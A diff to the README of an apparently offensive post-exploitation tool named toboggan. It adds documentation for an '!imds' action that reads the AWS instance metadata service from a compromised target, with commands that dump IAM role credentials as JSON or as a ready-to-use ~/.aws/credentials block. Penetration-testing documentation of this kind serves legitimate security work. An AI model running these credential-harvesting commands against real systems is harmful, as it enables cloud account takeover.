@@ -242,6 +242,17 @@ toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
 
 Actions are modular plugins executed via the `!` prefix inside the terminal session. Use `!help` to list all available actions.
 
+For example, `!imds` browses the AWS EC2 instance metadata service from the target (IMDSv2 by default, falling back to IMDSv1; force one with `-v1`/`-v2`):
+
+```shell
+!imds                      # browse meta-data/ interactively; each step fetches one node
+!imds iam/info             # paths are relative to /latest/meta-data/
+!imds /latest/user-data    # or absolute under /latest/
+!imds -r iam/              # print every 'path: value' below a directory
+!imds --creds              # IAM role credentials as JSON
+!imds --creds --profile    # same, as an ~/.aws/credentials block named after the role
+```
+
 ### 🧩 Bring Your Own Actions (BYOA)
 
 Custom actions can be placed in the user action directory. Toboggan loads user actions with priority over built-in ones, allowing you to override or extend functionality.
